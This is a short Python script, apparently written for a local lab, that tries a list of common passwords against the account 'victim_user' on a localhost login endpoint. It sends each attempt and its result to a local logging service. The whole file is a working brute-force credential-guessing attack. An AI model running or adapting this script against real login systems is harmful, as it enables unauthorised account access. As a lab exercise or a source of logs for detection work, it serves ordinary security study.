import requests
import datetime
import time

URL = "http://localhost:8000/login"
LOG_URL = "http://localhost:5001" # idk but this run just fine
user = "victim_user"
passwords = ["1234",  "guess4", "admin", "letmein", "guess1", "guess2", "guess3","password"]

def utc_now_z():
    return datetime.datetime.utcnow().isoformat(timespec="milliseconds") + "Z"

for i, p in enumerate(passwords):
    r = requests.post(URL, json={"username": user, "password": p})
    result_status = "success" if r.json().get("ok") else "failed"

    log_data = {
        "timestamp": utc_now_z(),
        "action": "login_attempt",
        "username": user,
        "password_try": p,
        "status": result_status
    }

    try:
        requests.post(LOG_URL, json=log_data, timeout=2)
    except requests.RequestException as e:
        print("[WARN] Could not POST log:", e)

    print("attempt", p, "=>", r.status_code, r.text)
    time.sleep(0.3)

